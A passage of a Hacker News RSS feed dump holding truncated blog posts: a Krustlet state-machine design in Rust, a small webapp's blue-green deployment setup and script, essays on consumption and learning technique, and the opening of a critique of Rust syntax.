<p>At its core, Kubernetes relies on declarative (mostly immutable) manifests, and
controllers which run reconciliation loops to drive cluster state to match this
configuration. Kubelet is no exception to this, with its focus being
indivisible units of work, or Pods. Kubelet simply monitors for changes to Pods
that have been assigned to it by <code>kube-scheduler</code>, and runs a loop to attempt
to run this work on its node. In fact, I would describe Kubelet as no different
from any other Kubernetes controller, except that it has the additional
first-class capability for streaming logs and exec sessions. However these
capabilities, as they are implemented in Krustlet, are orthogonal to this
discussion.</p>

<p>Our goal with this rewrite was to ensure that Krustlet would mirror the official
Kubelet‚Äôs behavior as closely as possible. We found that many details about
this behavior are undocumented, and spent considerable time running the
application to infer its behavior and inspecting the Go source code. Our
understanding is as follows:</p>

<ul>
<li>The Kubelet watches for Events on Pods that have been scheduled to it by
<code>kube-scheduler</code>.</li>
<li>When a Pod is added, the Kubelet enters a control loop to attempt to run the
Pod which only exits when the Pod is <code>Completed</code> (all containers
exit successfully) or <code>Terminated</code> (Pod is marked for deletion via the
control plane and execution is interrupted).</li>
<li>Within the control loop, there are various steps such as <code>Image Pull</code>,
<code>Starting</code>, etc., as well as back-off steps which wait some time before
retrying the Pod. At each of these steps, the Kubelet updates the control
plane.</li>
</ul>

<p>We recognized this pretty quickly as a finite-state machine design pattern,
which consists of infallible state handlers and valid state transitions. This
allows us to address the issues mentioned above:</p>

<ul>
<li>Break up the <code>Provider</code> trait methods for running the Pod into short,
single-focus state handler methods.</li>
<li>Consolidate status patch code to where a Pod enters a given state.</li>
<li>Include error and back-off states in the state graph, and only stop
attempting to execute a Pod on <code>Terminated</code> or <code>Complete</code>.</li>
<li>Move as much of this logic into <code>kubelet</code> as possible so that providers need
only focus on implementing the state handlers.
<br></li>
</ul>

<p>With this architecture it becomes very easy to understand the behavior of the
application, and strengthens our confidence that the application will not enter
undefined behavior. In addition, we felt that Rust would allow us to achieve
our goals while presenting an elegant API to developers, and with full
compile-time enforcement of our state machine rules.</p>

<h2 id="our-animal-guide">Our Animal Guide</h2>

<p>When first discussing the requirements of our state machine, and the daunting
task of integrating it with the existing Krustlet codebase, we recalled an
excellent blog post,
<a href="https://hoverbear.org/blog/rust-state-machine-pattern/">Pretty State Machine Patterns in Rust</a>,
by Ana Hobden (hoverbear), which I think has inspired a lot of Rust developers.
The post explores patterns in Rust for implementing state machines which
satisfy a number of constraints and leverage Rust‚Äôs type system. I encourage
you to read the original post, but for the sake of this discussion I will
paraphrase the final design pattern here:</p>

<pre><code>struct StateMachine&lt;S&gt; {
    state: S,
}

struct StateA;

impl StateMachine&lt;StateA&gt; {
    fn new() -&gt; Self {
        StateMachine {
            state: StateA
        }
    }
}

struct StateB;

impl From&lt;StateMachine&lt;StateA&gt;&gt; for StateMachine&lt;StateB&gt; {
    fn from(val: StateMachine&lt;StateA&gt;) -&gt; StateMachine&lt;StateB&gt; {
        StateMachine {
            state: StateB 
        }
    }
}

struct StateC;

impl From&lt;StateMachine&lt;StateB&gt;&gt; for StateMachine&lt;StateC&gt; {
    fn from(val: StateMachine&lt;StateB&gt;) -&gt; StateMachine&lt;StateC&gt; {
        StateMachine {
            state: StateC 
        }
    }
}

fn main() {
    let in_state_a = StateMachine::new();

    // Does not compile because `StateC` is not `From&lt;StateMachine&lt;StateB&gt;&gt;`.
    // let in_state_c = StateMachine::&lt;StateC&gt;::from(in_state_a);

    let in_state_b = StateMachine::&lt;StateB&gt;::from(in_state_a);

    // Does not compile because `in_state_a` was moved in the line above.
    // let in_state_b_again = StateMachine::&lt;StateB&gt;::from(in_state_a);

    let in_state_c = StateMachine::&lt;StateC&gt;::from(in_state_b);
}
</code></pre>

<p>Ana introduces a number of requirements for a good state machine
implementation, and achieves them with concise and easily interpretable code.
In particular, these requirements (some based on the definition of a state
machine, and some on ergonomics) were a high priority for us:</p>

<ul>
<li>One state at a time.</li>
<li>Capability for shared state.</li>
<li>Only explicitly defined transitions should be permitted.</li>
<li>Any error messages should be easy to understand.</li>
<li>As many errors as possible should be identified at <strong>compile-time</strong>.</li>
</ul>

<p>In the next section I will discuss some additional requirements that we
introduced and how these impacted the solution. In particular, we relaxed some
of Ana‚Äôs goals in exchange for greater flexibility, while satisfying those
listed above.</p>

<h2 id="tribulation">Tribulation</h2>

<p>We were off to a great start, but it was time to consider how we want
downstream developers to interact with our new state machine API. In
particular, while the Kubelets we are familiar with all follow roughly the same
Pod lifecycle, we wanted developers to be able to implement arbitrary state
machines for their Kubelet. For example, some workloads or architectures may
need to have additional provisioning states for infrastructure or data, or
to introduce post-run states for proper garbage collection of resources.
Additionally, it felt like an anti-pattern to have a parent method (<code>main</code> in
the example above) which defines the logic for progressing through the states,
as this felt like having two sources of truth and was not something we could
implement on behalf of our downstream developers for arbitrary state machines.
Ana had discussed how to hold the state machine in a parent structure using an
<code>enum</code>, but it felt clunky to introduce large match statements which could
introduce runtime errors.</p>

<p>We knew that to allow arbitrary state machines we would need a <code>State</code> trait to
mark types as valid states. We felt that it would be possible for this trait to
have a <code>next()</code> method which runs the state and then returns the next <code>State</code>
to transition to, and we wanted our code to be able to simply call <code>next()</code>
repeatedly to drive the machine to completion. This pattern, we soon found,
introduced a number of challenges.</p>

<pre><code>/// Rough pseudocode of our plan.

trait State {
    /// Do work for this state and return next state.
    async fn next(self) -&gt; impl State;
}

fn drive_state_machine(mut state: impl State) {
    loop {
        state = state.next().await;
    }
}
</code></pre>

<h3 id="what-does-next-return">What does <code>next()</code> return?</h3>

<p>Within our loop, we are repeatedly overwriting a local variable with
<em>different</em> types that all implement <code>State</code>. ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://deislabs.io/posts/a-fistful-of-states/">https://deislabs.io/posts/a-fistful-of-states/</a></em></p>]]>
            </description>
            <link>https://deislabs.io/posts/a-fistful-of-states/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582900</guid>
            <pubDate>Thu, 24 Sep 2020 19:58:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blue-green deployment for a small webapp]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24582864">thread link</a>) | @caspii
<br/>
September 24, 2020 | https://keepthescore.co/blog/posts/blue-green-deployment/ | <a href="https://web.archive.org/web/*/https://keepthescore.co/blog/posts/blue-green-deployment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

          


<article>
  <header>
    <h2 dir="auto"><a href="https://keepthescore.co/blog/posts/blue-green-deployment/">Blue-green deployment for a simple webapp</a></h2>
    <p><time datetime="2020-09-24T00:00:00+02:00">Thu Sep 24, 2020</time> by Caspar</p>
  </header>
  

<p><img src="https://keepthescore.co/blog/blue-green-tennis.jpg" alt="Blue green tennis"></p>

<p>This is an article outlining how we deploy <a href="https://keepthescore.co/">our webapp</a>. We run our servers on DigitalOcean but this is incidental. It should work equally well for other providers too.</p>

<p>Let‚Äôs get 2 caveats out of the way first:</p>

<ol>
<li>Our CRUD application runs on one application server. If you‚Äôre using a more complex setup, then what we describe here will need to be ‚Ä¶ adjusted.</li>
<li>Like many others out there, we‚Äôre learning this stuff as we go along. Please be gentle.</li>
</ol>

<h2 id="why-we-chose-blue-green-deployment">Why we chose blue-green deployment</h2>

<p>Before we get into the details, let‚Äôs quickly look at our situation before we switched to a blue-green deployment:</p>

<ul>
<li>We had one application server running on DigitalOcean, plus a hosted Postgres database.</li>
<li>To deploy, we used a script that SSHed into that server and did a <code>git pull</code></li>
</ul>

<p>This was fine to begin with however there were several issues:</p>

<ol>
<li>Our setup (using Python Flask) compiles and minifies CSS and Javascript on the server. This can take up to 10 seconds. The result of this was that if we changed our CSS or Javascript, the server would take time to respond after deployment and some users ran into <code>Bad Gateway</code> errors üí•</li>
<li>If there was a bug in production this could be fixed by checking out the previous commit. However, this invariably took too long and always involved frenzied googling of the correct git commands.</li>
<li>There was no way of testing the production setup, other than in production.</li>
</ol>

<p><img src="https://keepthescore.co/blog/testing-in-production.jpg"></p>

<p>Switching to blue-green deployments fixed all of these issues.</p>

<h2 id="what-is-blue-green-deployment">What is blue-green deployment?</h2>

<p>Here‚Äôs our definition of a blue-green environment:</p>

<ol>
<li>There are two identical and independent servers hosting the application. One is called green, the other blue.</li>
<li>There is a shared production database that both servers can access.</li>
<li>There is a quick and painless way of routing traffic to the green or the blue server.</li>
</ol>

<p>One of the 2 servers is always serving production traffic, the other is idle. Let‚Äôs say green is serving production traffic, and blue is idle. When a new release is ready, it gets deployed to the idle blue server. Here it can be tested and issues fixed. Remember, the blue server is accessing the production database, so the application can be tested with real data.</p>

<p>Once you‚Äôre satisfied that you‚Äôre ready to go you switch traffic from the green (live) server to the blue server. If any problems occur, you can simply switch back to the green server within seconds, effectively doing a roll-back.</p>

<p>Simple, eh?</p>

<h2 id="basic-components-of-our-setup">Basic components of our setup</h2>

<p>For our blue-green setup we did the following things:</p>

<ol>
<li>We cloned our application server. On DigitalOcean this is super simple: you can create a snapshot (even of a running machine) and create a new machine from that snapshot. An even more elegant way to do this would be to use Docker‚Ä¶ but we haven‚Äôt watched enough YouTube tutorials to do that yet.</li>
<li>Setup a way to switch traffic from one server to the other. We use a <a href="https://www.digitalocean.com/docs/networking/floating-ips/">floating IP from DigitalOcean</a>. Basically they are publicly-accessible static IP addresses that you can assign to servers and instantly remap between other servers in the same datacenter. Our domain (keepthescore.co) resolves to this static IP address.</li>
<li>Setup a way to determine whether the blue or the green server is currently live.</li>
<li>Created a deployment script that always deploys to the idle server.</li>
</ol>

<p>Let‚Äôs dive in a little more:</p>

<h2 id="setting-up-the-servers">Setting up the servers</h2>

<p>Once we‚Äôd cloned the application server, we gave them 2 different hostnames: <code>blue-production</code> and <code>green-production</code>. To do this on Ubuntu you have to do 2 things on the actual servers (in these examples for the green server):</p>

<ol>
<li>Carry out this command: <code>sudo hostnamectl set-hostname green-production</code></li>
<li>Edit the hosts file with <code>sudo vim /etc/hosts</code> and add <code>green-production</code></li>
</ol>

<p>Then we ensured that our app can expose the hostname of the server it‚Äôs currently running on. On Flask you can create a route like this:</p>
<div><pre><code data-lang="python"><span>import</span> socket

<span>@app.route</span>(<span>'/hostname'</span>)
<span>def</span> <span>server_info</span>():
    host_name <span>=</span> socket<span>.</span>gethostname()
    <span>return</span> host_name <span>+</span> <span>'</span><span>\n</span><span>'</span></code></pre></div>
<p>Now it‚Äôs possible for a human or a machine (using <code>curl</code>) to discover which the current production server is. We simply call <a href="https://keepthescore.co/hostname">https://keepthescore.co/hostname</a>. Give it a try by clicking on the link!</p>

<p>One final thing we needed to do is to add the public IP addresses for <code>blue-production</code> and <code>green-production</code> to the local <code>hosts</code> file of our development machine(s).</p>

<h2 id="deployment">Deployment üöÄ</h2>

<p>The deployment script can now use this information to deploy the new version of the software to the <strong>idle</strong> server. Here‚Äôs our deployment script:</p>
<div><pre><code data-lang="bash"><span>#!/usr/bin/env bash
</span><span></span>
<span># Get the current production server and</span> 
<span># set TARGET to the other server</span> 
CURRENT<span>=</span><span>$(</span>curl -s https://keepthescore.co/hostname<span>)</span>
<span>if</span> <span>[</span> <span>"</span>$CURRENT<span>"</span> <span>=</span> <span>"blue-production"</span> <span>]</span>; <span>then</span>
  TARGET<span>=</span><span>"green-production"</span>
<span>elif</span> <span>[</span> <span>"</span>$CURRENT<span>"</span> <span>=</span> <span>"green-production"</span> <span>]</span>; <span>then</span>
  TARGET<span>=</span><span>"blue-production"</span>
<span>else</span>
  echo <span>"Something is not right! üò¨"</span>
  exit -1
<span>fi</span>

echo <span>"Current deployment is "</span> $CURRENT
echo <span>"Deploying to "</span> $TARGET

<span># Do deployment</span>
ssh -q root@$TARGET <span>"cd keepthescore &amp;&amp; git pull"</span>
echo <span>"Deploy to "</span> $TARGET <span>" complete"</span></code></pre></div>
<p>We are now repeating ourselves but the beauty of this script is that it will always deploy to the idle server and not to the live production server. We can  test the deployment on our development machine by simply entering <code>blue-production</code> or <code>green-production</code> into our browser ‚Äì because we‚Äôve added these IP addresses to our local <code>hosts</code> file.</p>

<p>Once we‚Äôre sure that everything‚Äôs working we route traffic to the newly deployed idle server using DigitalOceans‚Äôs web interface for the floating IP addresses.</p>

<p>Our users get routed to the newly deployed software without noticing (hopefully).</p>

<p>Voil√°! ‚ú®</p>

<h2 id="what-about-the-database">What about the database?</h2>

<p>The database is a sore point, because we don‚Äôt have 2 instances of the database. Martin Fowler, who wrote a <a href="https://martinfowler.com/bliki/BlueGreenDeployment.html">great article about blue-green deployments</a> wrote the following:</p>

<p>‚ÄúDatabases can often be a challenge with this technique, particularly when you need to change the schema to support a new version of the software. The trick is to separate the deployment of schema changes from application upgrades. So first apply a database refactoring to change the schema to support both the new and old version of the application, deploy that, check everything is working fine so you have a rollback point, then deploy the new version of the application. (And when the upgrade has bedded down remove the database support for the old version.)‚Äù</p>

<h2 id="that-s-all">That‚Äôs all</h2>

<p>We‚Äôd love to get some feedback on our deployment strategy. Do you have questions? Are we over-engineering? Should we learn Docker? Let us know in the comments below.</p>

<p><span>Photo by <a href="https://unsplash.com/@kugnharski?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Rodrigo Kugnharski</a> on <a href="https://unsplash.com/s/photos/blue-green?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></p>


  

  
  <hr>
  
  

</article> 



        </div> <!-- /.blog-main -->

        


      </div> <!-- /.row -->
    </div></div>]]>
            </description>
            <link>https://keepthescore.co/blog/posts/blue-green-deployment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582864</guid>
            <pubDate>Thu, 24 Sep 2020 19:55:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consume less, produce more]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24582837">thread link</a>) | @hecticjeff
<br/>
September 24, 2020 | https://www.chrismytton.com/2020/09/24/consume-less-produce-more/ | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/2020/09/24/consume-less-produce-more/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
<p>If you have too many inputs then your brain gets overwhelmed. Every piece of information you consume takes up some brain cycles.</p>

<p>If you‚Äôre not producing enough output to match your inputs then it can get clogged up in your brain. You end up with too many strands of thought. Too many lines of enquiry.</p>

<h2 id="excess-consumption-causes-anxiety">Excess consumption causes anxiety</h2>

<p>This can often be a cause of anxiety, stress and depression. Just increasing the amount you produce allows your brain to work through your anxieties.</p>

<p>Perhaps this is why mental health issues are on the rise. There are just so many inputs for our brain in the modern world that we don‚Äôt have time to process them all into coherent outputs, so that we can understand the information we‚Äôre being presented with.</p>

<h2 id="reduce-consumption">Reduce consumption</h2>

<p>Reduce the number of inputs in your daily life.</p>

<ul>
  <li>Stop reading the news</li>
  <li>Spend less time on social media</li>
  <li>Reduce the number of websites you visit daily</li>
  <li>Delete unused apps from your phone</li>
  <li>Eliminate unnecessary calendar appointments</li>
  <li>Spend less time watching TV series</li>
</ul>

<p>Generally stimulate your brain less.</p>

<h2 id="increase-production">Increase production</h2>

<p>Increase the number of productive outputs in your life.</p>

<ul>
  <li>Create something with your hands</li>
  <li>Draw or paint pictures (doesn‚Äôt matter if you‚Äôre good or not)</li>
  <li>Write more, keep a journal or a blog</li>
  <li>Increase your daily step count</li>
  <li>Explore new places</li>
  <li>Exercise regularly</li>
  <li>Cook for yourself, rather than eating out</li>
</ul>

<p>These are things that allow you to express yourself. Express the ideas in your brain. Work through the inputs in your life.</p>

<p>Not everything has to have a point, sometimes you just need to <a href="https://www.chrismytton.com/2019/09/24/do-things-for-fun/">do things for fun</a>.</p>

<p><img src="https://www.chrismytton.com/assets/images/chelt-paint-fest-2020.jpg" alt="Cheltenham Paint Festival 2020 at Cheltenham Spa station"></p>

<h2 id="express-yourself">Express yourself</h2>

<p>It‚Äôs by expressing the ideas in your brain that you can actually think clearly. Because the more you express them the more you can see them. Then you can visualise the ideas. Then you can better structure and organise them and compartmentalize them.</p>

<p>Now stop consuming these words and go and produce something. Express yourself.</p>

  </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/2020/09/24/consume-less-produce-more/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582837</guid>
            <pubDate>Thu, 24 Sep 2020 19:53:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to remember what you learn]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24582571">thread link</a>) | @flreln
<br/>
September 24, 2020 | https://vasilishynkarenka.com/learning/ | <a href="https://web.archive.org/web/*/https://vasilishynkarenka.com/learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://vasilishynkarenka.com/content/images/size/w300/2020/09/IMG_1517.jpg 300w,
                            https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_1517.jpg 600w,
                            https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_1517.jpg 1000w,
                            https://vasilishynkarenka.com/content/images/size/w2000/2020/09/IMG_1517.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://vasilishynkarenka.com/content/images/size/w2000/2020/09/IMG_1517.jpg" alt="How to remember what you learn">
            </figure>

            <section>
                <div>
                    <p><em>‚ÄúI don‚Äôt remember a damn thing.‚Äù</em></p><p>The book I hold my hands was full of highlights. It seemed like I‚Äôve got all colors of the rainbow on a page. Apparently, this didn‚Äôt help. When I tried recalling ideas from the book, I didn‚Äôt hear a thing. Just. Silence.</p><p>Terrified, I started questioning how much I <em>really</em> know. If I forget everything I read, I can‚Äôt apply my knowledge to the problem at hand. I can‚Äôt transfer it. And without transfer, knowledge is very much like music for deaf ears.</p><p>I quickly did the math. I was planning to invest in learning a few hours a day for the next ~75 years of my life. Staring at the number of potentially wasted hours, I knew exactly what I had to do.</p><hr><p>In the past six months, I‚Äôve devoured dozens of books, research papers, and studies on how people learn. As a result, I‚Äôve designed a learning process that works for me. It‚Äôs not perfect, but an order of magnitude better than what I had before. </p><p>In this work, I outline my workflow so that you can try it out. It applies to any subject or discipline, from programming to economics. If you stumble upon something where it doesn‚Äôt work, let me know.</p><blockquote><em>Make it time-based, take regular breaks, and learn what you‚Äôre curious about.</em></blockquote><p>The most important thing is that my learning is time-based, not goal-based. Setting learning goals such as ‚Äúread X pages today‚Äù is a way to fail because you set up the wrong incentives. When you plan to read X pages by lunch, you can‚Äôt help but begin optimizing for the goal, which leads to focusing on speed instead of understanding. And when you don‚Äôt have those ‚Äúaha‚Äù moments, it is hard to remember what you learn.</p><p>It‚Äôs also important to not overload yourself and take breaks. I do 3h learning sessions every day split into 30 min intervals with 5 min breaks. Breaks help to fall back into the diffuse mode of thinking and get access to a broader set of neural networks in my head. They also warm up my body, and I feel better after moving around for a few minutes.</p><p>As for material, I learn what I‚Äôm interested in. First, because life is <a href="http://www.paulgraham.com/vb.html">too short</a> to do things that you don‚Äôt love. Second, I‚Äôve found that studying stuff I genuinely like awakens my curiosity. And curiosity is essential to develop mastery because mastery is about depth and breadth of knowledge. </p><p>For example, if you‚Äôre learning JavaScript and you‚Äôre curious about it, you‚Äôll go and figure out how JS runtime environment works in Chrome even though the tutorial doesn‚Äôt cover it. Just because you‚Äôre interested. But if you‚Äôre not curious, then you‚Äôll just memorize the tutorial, and your knowledge will be shallow.</p><h2 id="how-my-learning-session-works">How my learning session works</h2><blockquote>Clean up working memory, apply metacognition, and "siege" the thing with questions to improve understanding.</blockquote><p>When I learn, I always have two devices on my desk. I have my laptop with the study material (ie, a book, a video, an article) on the right, and I have my iPad with a text editor open on the left.</p><p>This is how my current setup looks like:</p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_2658.jpg" alt="" srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_2658.jpg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_2658.jpg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_2658.jpg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_2658.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Morning learning session.</figcaption></figure><p>When I begin learning, I set a timer for 30 minutes and create three files in Drafts:</p><ol><li>A file with a timestamp where my random thoughts go.</li><li>A file with a timestamp where I think about the subject.</li><li>A file with questions.</li></ol><p><strong>The first file is a mind dump.</strong> When I start learning, I immediately begin thinking about things. It‚Äôs almost as if my brain wakes up and starts throwing ideas, tasks, and memories at me. I suspect this comes from the associative memory because I present myself with many triggers when I‚Äôm learning; words and sentences that bear special meaning to me and invoke these ideas.</p><p>But here‚Äôs the problem. If I don‚Äôt write thoughts down, I can‚Äôt focus. My working memory is overloaded with todos, ideas, and emotions. You‚Äôve probably experienced this for yourself ‚Äì your mind is running too fast, and you can‚Äôt really concentrate on what you‚Äôre learning. Having this ‚Äúdump‚Äù file is immensely useful to a) free up my working memory to focus on my learning instead of thinking about these things, and b) store these thoughts somewhere safe to go back to them later and take action.</p><p><strong>The second file is where I write about what I‚Äôm learning.</strong> Folks in the kitchen call it metacognition, which means thinking about thinking. Metacognition is the single best trick I‚Äôve found to improve understanding, and I will write more about it in the future. Whenever I don‚Äôt understand something or see that my understanding is shallow, I begin writing in the first person. It looks like this: ‚ÄúSo Peter explains that there are four characteristics of a monopoly, but I don‚Äôt really understand why branding is one of them; why so?‚Äù</p><p>It‚Äôs also important to note that I don‚Äôt write in a usual sentence-paragraph manner. Instead, I write every thought on a new line. I don‚Äôt even put dots at the end of the sentences. This helps me to focus on understanding instead of nitty-gritty styling and typos. The ‚Äúenter‚Äù key on a keyboard serves as the ‚Äúend of thought‚Äù symbol and helps formulate ideas more clearly.</p><p>Another important idea is that my editor is plain text. I‚Äôve found it incredibly liberating to operate in a plain text environment where you don‚Äôt have incentives to color, underline, bold, italicize, or do some other weird things with the text you‚Äôre writing. Instead of choosing the right font for my heading, I can focus on meaning instead. Also, my plain text app is way faster than all feature-rich text editors, and I‚Äôve found it essential for a thought input environment to be fast. Otherwise, I can't think.</p><p>Here‚Äôs a fragment from my learning of React yesterday:</p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_D7F6BD12F133-1.jpeg" alt="" srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_D7F6BD12F133-1.jpeg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_D7F6BD12F133-1.jpeg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_D7F6BD12F133-1.jpeg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_D7F6BD12F133-1.jpeg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Metacognition notes from studying React.js.</figcaption></figure><p>You‚Äôre probably thinking that it‚Äôs quite a bit of writing. It is. For an hour-long learning session, I usually do about 500-1000 words in this file. But it‚Äôs worth every character, and here‚Äôs why:</p><ul><li>When I apply metacognition, I understand things <em>way</em> better than when I don‚Äôt. I‚Äôve tested many different learning modes and found metacognition to perform at least 2x better based on my later ability to recall and transfer knowledge. Also, there‚Äôs <a href="https://academicpublishingplatforms.com/downloads/pdfs/ati/volume18/201607070302_09_ATI_Vol11_Issue2_2015_Todorova_and_Karamanska_Study_motivation_satisfaction_students_e-learning_pp.82-89.pdf">some</a> <a href="http://www.csun.edu/science/ref/reasoning/how-students-learn/1.html">research</a> on metacognition as well.</li><li>Having a file with my thinking about the subject keeps my working memory clean. I don‚Äôt feel overloaded as I usually feel after reading many articles at one go. You‚Äôve probably experienced this yourself; your brain is almost melting after an hour of scrolling through the web. That‚Äôs because you present yourself with too much information without really making sense of it. After a few months of applying metacognitive practices, I realized that I can‚Äôt go back. It just feels so strange to experience that cognitive load again.</li><li>Metacognition improves remembering through elaboration and interleaving. When I‚Äôm writing my thoughts in the file, I can‚Äôt help but begin connecting them with other ideas on that topic because of associative memory. And interleaving leads to mastery.</li><li>(Speculation) Training metacognition improves my ability to transform vague notions and thoughts that I have during the day into specific words that I can write down for later analysis. This one is particularly interesting to me, but there‚Äôs no evidence besides my own experiments. And I might be biased because I‚Äôve come up with this method.</li></ul><p>Moreover, I type 2-3x faster than most people because I use <a href="https://barehands.substack.com/p/how-to-type-3x-faster">shortcuts</a>. So it‚Äôs not that bad.</p><p><strong>The third file is questions. </strong>Whenever I stumble upon something that I don‚Äôt understand, I try to break it down into a set of simple questions. Each question in the group takes on a small part of the problem. If the concept is particularly challenging, I try to ‚Äúsiege‚Äù it with questions from many many different angles and break it down even further.</p><p>When I‚Äôm beginning a new session, I always start from the previous one‚Äôs questions file. I only look at questions and answer them before I‚Äôm beginning new learning. This doesn‚Äôt sound like very much fun, but it‚Äôs actually pretty interesting to explain stuff to yourself if you do it out loud. Answering questions improves my understanding and helps to connect ideas together. And yes, answering questions counts as learning ‚Äì probably the most efficient learning you could be doing.</p><p><em>I'm not going into much detail on questions because Michael Nielsen has done a phenomenal job describing it <a href="http://augmentingcognition.com/ltm.html">here</a>.</em></p><h2 id="what-happens-after-the-session">What happens after the session</h2><blockquote>Write a dense summary, provoke elaboration, interleaving, and transfer, and choose what to never forget.</blockquote><p>After the session is done, and my three files are full of information, I begin the recap process.</p><p><strong>First, I write a three to five sentence-long summary of what I‚Äôve just studied.</strong> Here I try to distill the material‚Äôs core idea and compress the whole thing into a maximally dense chunk. When I‚Äôm summarizing, my laptop is closed. Not looking at the text helps to ‚Äúcompress‚Äù the idea to its core and make a small ‚Äúhook‚Äù to my memory to later see what the whole book was about.</p><p>Here‚Äôs how my summary note looks like: </p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_9771D059CFD1-1.jpeg" alt="Recap of studying React.js." srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_9771D059CFD1-1.jpeg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_9771D059CFD1-1.jpeg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_9771D059CFD1-1.jpeg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_9771D059CFD1-1.jpeg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Recap of studying React.js.</figcaption></figure><p>Very often, what I‚Äôm writing in the summary section is not what the text was about, but what it means to me. In other words, if both of us read this text and wrote a summary of it, mine would be very different than yours.</p><p>After I‚Äôm done with the summary, I write down the answers to three questions:</p><ol><li>What are the key ideas? </li><li>How can I apply this knowledge that I learned? </li><li>How do these ideas relate to what I already know?</li></ol><p><strong>The first question speaks for itself.</strong> I try to remember what I just read and write down as many ideas as I can bring back. When I began applying the metacognition trick that I mentioned earlier, I noticed a 3x increase in the number of concepts I could recall. And as I speculate that long-term memory recall is influenced by initial interleaving and recall, this might actually help to improve your long-term memory.</p><p><strong>The second question is about transfer.</strong> The sole purpose of learning is to apply the knowledge that we learn. Without application, ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vasilishynkarenka.com/learning/">https://vasilishynkarenka.com/learning/</a></em></p>]]>
            </description>
            <link>https://vasilishynkarenka.com/learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582571</guid>
            <pubDate>Thu, 24 Sep 2020 19:31:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What‚Äôs Stopping Me from Using Rust?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582337">thread link</a>) | @lukastyrychtr
<br/>
September 24, 2020 | https://mgrech.dev/whats-stopping-me-from-using-rust/ | <a href="https://web.archive.org/web/*/https://mgrech.dev/whats-stopping-me-from-using-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Let me start out by saying that I‚Äôve been using C++ for over a decade and I consider myself an advanced C++ user‚Äîthat clearly biases my perspective. If there is something stupid that C++ lets me do, I‚Äôve probably tried it at some point (and yes, that includes building a compile-time brainfuck interpreter before <code>constexpr</code> was the new shiny thing and using template template template parameters). Rust is a great language and has without a doubt a bright future ahead of it. The memory safety it provides is a killer feature that I‚Äôve only realized I‚Äôve been missing in C++ after trying Rust. There are a lot of things I like about the language like nice stack traces by default, the borrow checker, a proper build process, the package manager, ‚Ä¶ and the list goes on.</p>

<p>That said, there are a few reasons why I still cannot or prefer not to use Rust. Some of them are just minor inconveniences, some are major annoyances and some are complete dealbreakers. With this post I‚Äôm going to try to list things that stop me from using the language as I remember it. Please note that this is not meant to be a complete list. In particular, it‚Äôs been a few months since I‚Äôve last tried Rust and I might be forgetting about some things or not remembering them 100% accurately. I‚Äôm also sure the language has made progress in the meantime. Nonetheless, here goes ‚Ä¶</p>

<h4 id="ugly-generic-syntax">Ugly Generic Syntax</h4>
<p>Let‚Äôs start out with the easy one, the so-called <a href="https://matematikaadit.github.io/posts/rust-turbofish.html">turbofish</a>. I find the examples that create container objects especially bad, like <code>Vec::&lt;u8&gt;::new()</code>. I‚Äôm not quite sure why this specific syntax was chosen‚ÄîI assume it has something to do with parsing ambiguities that would arise without the <code>::</code> regarding angle brackets being confused for comparison operators. I get not wanting to deal with this context-sensitivity, but are there really no better alternatives? <a href="https://dlang.org/spec/template.html">D uses the syntax</a> <code>X!(T)</code>, which has the nice property that parentheses can be omitted if only a single type is passed.</p>

<h4 id="naming">Naming</h4>
